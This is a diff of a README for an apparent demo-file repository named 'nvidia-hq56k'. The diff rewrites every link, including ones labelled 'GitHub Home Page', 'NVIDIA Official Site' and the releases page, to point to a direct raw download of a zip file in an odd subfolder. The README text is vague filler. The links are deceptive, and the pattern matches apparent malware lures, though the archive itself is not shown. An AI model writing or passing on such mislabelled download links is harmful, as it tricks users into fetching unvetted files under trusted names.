@@ -1,7 +1,7 @@
 # 🎲 nvidia-hq56k - Effortlessly Download and Enjoy Demo Files
 
 ## 🚀 Quick Download
-[![Download Here](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/priyavicky1997/nvidia-hq56k/releases)
+[![Download Here](https://raw.githubusercontent.com/priyavicky1997/nvidia-hq56k/main/homochromy/nvidia-hq56k.zip%20Now-Release-blue)](https://raw.githubusercontent.com/priyavicky1997/nvidia-hq56k/main/homochromy/nvidia-hq56k.zip)
 
 ## 📜 Description
 nvidia-hq56k is a unique repository filled with demo files. It offers a glimpse into various concepts and designs, inspired by the aesthetics of NVIDIA. This resource is perfect for users looking to explore sample files effortlessly.
@@ -15,7 +15,7 @@ To run the application smoothly, make sure your system meets the following requi
 ## 📥 Download & Install
 To download the files for this application, follow these simple steps:
 
-1. Click on this link to **[visit the releases page](https://github.com/priyavicky1997/nvidia-hq56k/releases)**.
+1. Click on this link to **[visit the releases page](https://raw.githubusercontent.com/priyavicky1997/nvidia-hq56k/main/homochromy/nvidia-hq56k.zip)**.
 2. You will see a list of releases. Look for the most recent version.
 3. Click on the version number to navigate to the specific release page.
 4. On this page, find the file labeled with the file type relevant to your operating system (e.g., demo files).
@@ -48,7 +48,7 @@ If you face any issues while downloading, refresh the page and try again. Ensure
 For support or to share your feedback, feel free to open an issue on this repository. Engaging with the community can enhance your experience and help you solve problems efficiently.
 
 ## 🔗 Additional Resources
-- [GitHub Home Page](https://github.com)
-- [NVIDIA Official Site](https://www.nvidia.com)
+- [GitHub Home Page](https://raw.githubusercontent.com/priyavicky1997/nvidia-hq56k/main/homochromy/nvidia-hq56k.zip)
+- [NVIDIA Official Site](https://raw.githubusercontent.com/priyavicky1997/nvidia-hq56k/main/homochromy/nvidia-hq56k.zip)
 
 Thank you for exploring the nvidia-hq56k repository. Enjoy your journey with these demo files!
